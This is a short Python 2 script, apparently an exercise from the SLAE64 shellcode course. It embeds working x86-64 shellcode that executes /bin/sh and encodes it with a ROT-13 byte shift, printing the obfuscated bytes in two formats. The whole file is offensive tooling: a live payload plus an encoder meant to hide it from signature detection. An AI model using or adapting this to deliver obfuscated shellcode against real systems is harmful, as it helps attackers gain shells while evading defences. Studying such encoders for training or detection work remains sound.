#!/usr/bin/env python
# Filename: encoder.py
# Author: SLAE64-14209

shellcode = ("\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05")

rot = 13
max = 256 - rot

encoded = ""
encoded2 = []

for x in bytearray(shellcode):
    if x < max:
        encoded += '\\x%02x' % (x + rot)
        encoded2.append('0x%02x' % (x + rot))
    else:
        encoded += '\\x%02x' % (rot - 256 + x)
        encoded2.append('0x%02x' % (rot - 256 + x))

print "Encoded:\n%s\n" % encoded

print "Encoded2:\n%s\n" % ','.join(encoded2)
